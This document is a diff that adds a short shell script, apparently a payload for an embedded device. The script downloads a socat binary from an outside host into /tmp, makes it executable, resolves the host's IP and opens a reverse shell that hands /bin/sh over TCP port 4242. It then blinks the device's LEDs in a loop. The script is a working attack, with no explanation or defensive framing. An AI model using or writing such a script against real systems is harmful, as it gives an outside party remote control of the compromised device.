@@ -1,0 +1,21 @@
+#!/bin/sh
+HOST=bla.com
+PORT=4242
+
+# Download socat for the reverse shell
+curl -k https://${HOST}/s/socat -o /tmp/socat
+chmod +x /tmp/socat
+
+# Reverse shell
+# Necessary to manually grab the IP because the statically linked socat can't resolve it
+IP=$(ping -c1 ${HOST} | head -n1 | cut -d'(' -f2 | cut -d')' -f1)
+/tmp/socat exec:/bin/sh,pty,stderr,setsid,sigint,sane tcp:${IP}:${PORT} &
+
+# And now, a small lightshow :-)
+while true; do
+   leddown
+   sleep 1
+   ledup
+   sleep 1
+done
+
